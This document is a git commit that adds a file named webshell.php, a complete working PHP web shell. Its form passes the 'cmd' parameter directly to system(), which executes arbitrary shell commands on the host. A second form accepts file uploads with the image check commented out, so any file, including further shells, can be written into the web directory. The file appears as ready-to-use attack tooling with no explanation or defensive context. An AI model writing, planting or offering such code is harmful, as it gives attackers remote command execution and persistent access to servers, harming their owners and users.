434af4aa509cd50905b4bfc950ef0cd7a3acc252
cainesmckoy <caine12393@yahoo.com>
2019-03-27 02:22:24 -0400

    Add files via upload

---
+++ webshell.php
@@ -0,0 +1,38 @@
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<form action="webshell.php" method="post" enctype="multipart/form-data">
+    Select image to upload:
+    <input type="file" name="fileToUpload" id="fileToUpload">
+    <input type="submit" value="Upload Image" name="submit">
+</form>
+<pre>
+<?php
+    if($_GET['cmd'])
+    {
+        system($_GET['cmd']);
+    }
+?>
+<?php
+$target_dir = "";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+$uploadOk = 1;
+$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
+// Check if image file is a actual image or fake image
+if(isset($_POST["submit"])) {
+    //$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
+        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
+    } else {
+        echo "Sorry, there was an error uploading your file.";
+    }
+ 
+}
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
